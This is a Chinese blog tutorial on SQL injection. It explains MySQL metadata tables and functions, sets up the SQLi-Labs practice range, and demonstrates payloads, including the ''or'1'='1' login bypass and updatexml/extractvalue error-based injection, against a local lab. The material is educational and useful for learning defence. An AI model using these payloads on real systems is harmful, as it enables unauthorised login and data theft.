<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SQL注入, 爱意">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SQL注入 | 爱意</title>
    <link rel="icon" type="image/jpeg" href="/favicon.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.2.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">爱意</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>Medias</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a target="_blank" rel="noopener" href="https://c.y.qq.com/base/fcgi-bin/u?__=MpCWb2N">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Musics</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://www.bilibili.com/bangumi/play/ep313199/?share_medium=web&share_source=qqzone&bbid=B10A6A9F-C26E-0125-79A7-022E57DFBEF055290infoc&ts=1661420533620">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Movies</span>
        </a>
      </li>
      
      <li>
        <a href="/books">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Books</span>
        </a>
      </li>
      
      <li>
        <a href="/galleries">
          
          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Galleries</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">爱意</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			Medias
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a target="_blank" rel="noopener" href="https://c.y.qq.com/base/fcgi-bin/u?__=MpCWb2N " style="margin-left:75px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>Musics</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://www.bilibili.com/bangumi/play/ep313199/?share_medium=web&share_source=qqzone&bbid=B10A6A9F-C26E-0125-79A7-022E57DFBEF055290infoc&ts=1661420533620 " style="margin-left:75px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
			      
		          <span>Movies</span>
                  </a>
                </li>
              
                <li>

                  <a href="/books " style="margin-left:75px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Books</span>
                  </a>
                </li>
              
                <li>

                  <a href="/galleries " style="margin-left:75px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
			      
		          <span>Galleries</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lfsdlfsd-sudo/lfsdlfsd-sudo.github.io.git" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Find Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lfsdlfsd-sudo/lfsdlfsd-sudo.github.io.git" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Find Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SQL注入</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-08-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-08-25
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    9.8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    42 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="I、数据库基础"><a href="#I、数据库基础" class="headerlink" title="I、数据库基础"></a>I、数据库基础</h1><p><code>数据库系统（Database System）</code> 数据库系统（DBS）包括了数据库（DB）和数据库管理系统（DBMS）</p>
<p><code>数据库（Database）</code>是按照数据结构来组织、存储的仓库</p>
<p><code>数据库管理系统（Database Manage System）</code>是用于管理数据库的系统</p>
<p>关系型数据库是采用了关系模型来组织数据的数据库，简单的来说，就是二维表格模型。</p>
<p>可以以<code>Excel</code>表格来做一个理解</p>
<ul>
<li>数据以表格的形式出现</li>
<li>每一行为各种记录的名称</li>
<li>每一列为记录名称对应的数据域</li>
<li>许多行和列组成了一张表单</li>
<li>若干的表单组成Database</li>
</ul>
<h2 id="数据库管理工具"><a href="#数据库管理工具" class="headerlink" title="数据库管理工具"></a>数据库管理工具</h2><ul>
<li><strong>Navicat</strong></li>
<li><strong>phpMyAdmin</strong></li>
</ul>
<h1 id="II、Mysql基础"><a href="#II、Mysql基础" class="headerlink" title="II、Mysql基础"></a>II、Mysql基础</h1><p>在学习SQL注入之前，我们需要对Mysql有一定的了解，</p>
<h2 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h2><p><code>Information_schema</code>数据库是MySQL自带的，它提供了访问数据库元数据的方式</p>
<p><code>元数据</code>是关于数据的数据，如数据库名、表名、列名和数据类型、访问权限。这些信息也可以叫<code>数据词典</code> </p>
<p>在MySQL中，把<code>information_schema</code>看作是一个信息数据库，其中保存着所有其他数据库的信息，例如数据库名、表名、列名等…….</p>
<p>information_schema中部分数据表及字段：</p>
<p><strong>SCHEMATA</strong>：提供了当前MySql实例中所有的数据库信息。<code>show database</code>的结果取之此表</p>
<p><code>SELECT SCHEMA_NAME FROM information_schema.SCHEMATA</code></p>
<ul>
<li>schema_name 字段为当前所有的数据库</li>
</ul>
<p><strong>TABLES</strong>：提供了关于数据库中表的信息。详细描述了某个表属于哪个shema等信息。<code>show tables from &lt;schema_name&gt;</code>的结果取之于此</p>
<p><code>SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;’</code></p>
<ul>
<li>table_schema 字段为表从属的数据库</li>
<li>table_name 字段为表名</li>
</ul>
<p><strong>COLUMNS</strong>：  提供数据库中表和列的信息。详细描述了某张表的所有列 及每列的信息。<code>show columns from &lt;schema_name&gt;.&lt;table_name&gt;</code>的结果取之此表</p>
<p><code>SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;&lt;schema_name&gt;’</code></p>
<ul>
<li>table_schema 字段为</li>
<li>table_name 字段为表名</li>
<li>column_name 字段为列名</li>
</ul>
<h2 id="二、注释"><a href="#二、注释" class="headerlink" title="二、注释"></a>二、注释</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># # 单行注释</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users # 这是一个单行注释</span><br><span class="line"></span><br><span class="line"># <span class="comment">-- 注释（杠、杠、空格）</span></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- 这是一个单行注释</span></span><br><span class="line"></span><br><span class="line"># <span class="comment">/* */</span> 这是一个多行注释</span><br><span class="line"><span class="comment">/*这是一个</span></span><br><span class="line"><span class="comment">多行注释*/</span></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<h2 id="三、常用函数"><a href="#三、常用函数" class="headerlink" title="三、常用函数"></a>三、常用函数</h2><h3 id="1、内置函数"><a href="#1、内置函数" class="headerlink" title="1、内置函数"></a>1、内置函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前的数据库</span><br><span class="line">DATABASE()</span><br><span class="line"></span><br><span class="line"># 查看当前数据库版本</span><br><span class="line">@<span class="variable">@VERSION</span> </span><br><span class="line">VERSION()</span><br><span class="line"></span><br><span class="line"># 查看用户</span><br><span class="line"><span class="keyword">user</span>()                        # 用户名</span><br><span class="line"><span class="built_in">current_user</span>()                # 当前用户名</span><br><span class="line"><span class="built_in">system_user</span>()                 # 系统用户名</span><br><span class="line"><span class="built_in">session_user</span>()                # 链接数据库的用户名</span><br><span class="line"></span><br><span class="line"># 内置函数</span><br><span class="line">@<span class="variable">@datadir</span>                     # 读取数据库路径</span><br><span class="line">@<span class="variable">@basedir</span>                     # MySQL安装路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os           # 操作系统</span><br><span class="line">@<span class="variable">@secure</span>_file_priv            # 查看数据库secure_file_priv 的参数值</span><br><span class="line">@<span class="variable">@character</span>_sets_dir          # 字符集安装目录</span><br><span class="line">@<span class="variable">@character</span>_set_server        # 字符集编码格式</span><br><span class="line">@<span class="variable">@hostname</span>;                   # 查看主机名</span><br></pre></td></tr></table></figure>

<h3 id="2、其他函数"><a href="#2、其他函数" class="headerlink" title="2、其他函数"></a>2、其他函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">concat([string],[string])  # 将两个字符串拼接为一个字符串</span><br><span class="line">concat_ws([sign],[string],[string])  # 将两个字符串使用符号拼接为一个字符串</span><br><span class="line">group_concat([<span class="keyword">array</span>],...,[<span class="keyword">array</span>])  # 将多组数据进行拼接，不同行之间使用逗号进行连接</span><br><span class="line"></span><br><span class="line">limit N,M  # 相当于 limit M <span class="keyword">offset</span> N , 从第 N 条记录开始, 返回 M 条记录</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>([string],[length])  # 返回字符串从左起length位 </span><br><span class="line"><span class="keyword">right</span>([string],[length])</span><br><span class="line">MID([string],[position],[length])</span><br><span class="line">REVERSE([string])  # 将字符串逆序输出</span><br><span class="line"></span><br><span class="line"><span class="built_in">count</span>()  # 返回查询到的结果数量</span><br></pre></td></tr></table></figure>

<h2 id="四、联合查询"><a href="#四、联合查询" class="headerlink" title="四、联合查询"></a>四、联合查询</h2><p>使用union字段可以进行联合查询，将前后两次查询结果拼接在一起，前提要求是两次查询的列数要相同</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 正常查询</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users</span><br><span class="line"># 联合查询</span><br><span class="line"># 可以看到查询结果中多了一个条目</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"># 当前部分查询无结果，后部分查询结果将作为结果</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="五、报错注入"><a href="#五、报错注入" class="headerlink" title="五、报错注入"></a>五、报错注入</h2><h3 id="1、xpath函数"><a href="#1、xpath函数" class="headerlink" title="1、xpath函数"></a>1、xpath函数</h3><p><code>updatexml()</code> <code>extractvalue()</code></p>
<p>在mysql 5.1中添加了对XML文档进行查询和修改的函数：updatexml（）extractvalue（）</p>
<p>这两个函数的作用相同，用一个不同的 xml标记 匹配和替换 原来的 xml块 的函数，可以简单理解为用于改变文档中符合条件的值</p>
<p><code>**updatexml()**</code>函数中需要传入三个参数：</p>
<p>第一个参数为string类型，代表xml文档的名称</p>
<p>第二个参数为xpath_string类型，代表路径</p>
<p>第三个参数为string类型，代表要替换的数据</p>
<p>报错的关键就在于第二个参数，当第二个参数中传入的值不为xpath_string类型的时候，该函数就会报错</p>
<figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username=&#x27;admin&#x27; and updatexml(1,0x7e,3)</span><br></pre></td></tr></table></figure>

<p><code>**extractvalue()**</code>和updatexml()除了参数数量之外基本相同</p>
<p>extractvalue(目标xml文档，xml路径)，报错点在第二个参数中</p>
<figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username=&#x27;admin&#x27; and extractvalue(1,0x7e)</span><br></pre></td></tr></table></figure>

<h1 id="III、SQLi-Labs靶场安装"><a href="#III、SQLi-Labs靶场安装" class="headerlink" title="III、SQLi-Labs靶场安装"></a>III、SQLi-Labs靶场安装</h1><h2 id="一、手动安装"><a href="#一、手动安装" class="headerlink" title="一、手动安装"></a>一、手动安装</h2><h3 id="1、下载源码"><a href="#1、下载源码" class="headerlink" title="1、下载源码"></a>1、下载源码</h3><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">GitHub - Audi-1&#x2F;sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.</a></p>
<p><a target="_blank" rel="noopener" href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/056dfc8b-3b3a-41c3-b102-7b76c0c2ec9f/sqli-labs-master.zip">sqli-labs-master.zip</a></p>
<h3 id="2、搭建WAMP环境"><a href="#2、搭建WAMP环境" class="headerlink" title="2、搭建WAMP环境"></a>2、搭建WAMP环境</h3><p>使用PHPstudy创建<code>PHP 5.3.29</code>环境和<code>Mysql 5.7.26</code>环境</p>
<p>可在”网站→管理→PHP版本→php5.3.29nts”选择使用的PHP版本</p>
<p><img src="https://secure2.wostatic.cn/static/cQVG828ZsSC2QH1RSPhqkd/image.png"></p>
<h3 id="3、复制网站文件"><a href="#3、复制网站文件" class="headerlink" title="3、复制网站文件"></a>3、复制网站文件</h3><p>将下载的<code>sqli-labs-master.zip</code>中的<code>sqli-labs-master 文件夹</code> 解压到<code>phpstudy安装目录</code>下的<code>WWW</code>目录中</p>
<h3 id="4、修改网站配置文件"><a href="#4、修改网站配置文件" class="headerlink" title="4、修改网站配置文件"></a>4、修改网站配置文件</h3><p>进入刚刚解压出的文件夹内</p>
<p>在文件夹<code>sql-connections</code>中选择文件<code>db-creds.inc</code>并打开</p>
<p>修改文件中的密码与PHPstudy中数据库密码相同，其他部分可不做修改</p>
<h3 id="5、初始化数据库"><a href="#5、初始化数据库" class="headerlink" title="5、初始化数据库"></a>5、初始化数据库</h3><p>进入主页：<a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/">http://192.168.31.98/sqli-labs/</a></p>
<p>打开靶场验证数据库是否可用</p>
<p><a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/sql-connections/setup-db.php">http://192.168.31.98/sqli-labs/sql-connections/setup-db.php</a></p>
<h2 id="二、Docker安装"><a href="#二、Docker安装" class="headerlink" title="二、Docker安装"></a>二、Docker安装</h2><p>使用Docker进行安装非常的简单</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search sqli-labs  <span class="comment"># 搜索sqli-labs靶场</span></span><br><span class="line">docker pull acgpiano/sqli-labs  <span class="comment"># 拉取指定的靶场</span></span><br><span class="line">docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure>

<p>这里将docker容器内的<code>80</code>端口映射到外部端口<code>8888</code>，映射端口可自行修改</p>
<h1 id="IV、SQL注入"><a href="#IV、SQL注入" class="headerlink" title="IV、SQL注入"></a>IV、SQL注入</h1><h2 id="一、概念："><a href="#一、概念：" class="headerlink" title="一、概念："></a>一、概念：</h2><p>所谓的SQL注入，就是通过把SQL命令插入到web表单递交到后台执行查询命令的字符串中，最终达到欺骗服务器执行恶意的SQL命令</p>
<p>用户可控的输入未经过滤就被带入到SQL语句中执行，从而导致SQL注入攻击的产生</p>
<h2 id="二、万能密码登陆"><a href="#二、万能密码登陆" class="headerlink" title="二、万能密码登陆"></a>二、万能密码登陆</h2><p>登陆功能，是web网站中常见的与数据库交互的一种的功能</p>
<p>万能密码，即是通过一个密码，绕过绕过登陆认证，成功登陆上系统</p>
<blockquote>
<p>‘or’1’&#x3D;’1</p>
</blockquote>
<p>万能密码的两种情况：<a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p>
<ul>
<li><code>username=admin</code>&amp;<code>password=&#39;or&#39;1&#39;=&#39;1</code></li>
</ul>
<p>成功登陆<code>Dumb</code>用户</p>
<ul>
<li><code>username=admin&#39;or&#39;1&#39;=&#39;1</code>&amp;<code>password=1</code></li>
</ul>
<p>成功登陆<code>admin</code>用户</p>
<p>从代码角度来分析原理：</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1c483cc-7399-45cc-8531-8d445bb0b9a4/Untitled.png" alt="Untitled"></p>
<p>情况一：<code>username=admin</code>&amp;<code>password=&#39;or&#39;1&#39;=&#39;1</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>情况二：<code>username=admin&#39;or&#39;1&#39;=&#39;1</code>&amp;<code>password=1</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<aside>

<p>💡 在Mysql中<code>and</code>的优先级是要高于<code>or</code>的，在语句中同时存在两个字段，将先执行<code>and</code>，再执行<code>or</code></p>
</aside>

<p>通过传入特殊构造的语句，改变原后台语句的含义，而导致登陆成功。</p>
<h2 id="三、SQL注入的危害"><a href="#三、SQL注入的危害" class="headerlink" title="三、SQL注入的危害"></a>三、SQL注入的危害</h2><p>1、数据与信息泄漏</p>
<p>2、网页被篡改、网站挂马</p>
<p>3、服务器被远程控制</p>
<p>4、影响服务可用性</p>
<p>5、用户和企业财产安全</p>
<h2 id="四、SQL注入的分类"><a href="#四、SQL注入的分类" class="headerlink" title="四、SQL注入的分类"></a>四、SQL注入的分类</h2><ul>
<li>联合查询注入</li>
<li>报错注入</li>
<li>时间盲注</li>
<li>布尔盲注</li>
<li>堆叠注入</li>
</ul>
<p>除此之外，还有其他分类的注入</p>
<ul>
<li>二次注入</li>
<li>HTTP头注入</li>
<li>宽字节注入</li>
</ul>
<h2 id="五、闭合方式"><a href="#五、闭合方式" class="headerlink" title="五、闭合方式"></a>五、闭合方式</h2><p>1、通过报错信息来进行判断</p>
<p>2、通过页面响应正确与否来判断</p>
<h3 id="1、单引号-39-39-：less-11"><a href="#1、单引号-39-39-：less-11" class="headerlink" title="1、单引号&#39;&#39; ：less-11"></a>1、单引号<code>&#39;&#39;</code> ：less-11</h3><p>输入单引号报错，输入其他符号页面响应正常</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/05f1096e-ed81-46eb-add0-62e01870ce78/Untitled.png" alt="Untitled"></p>
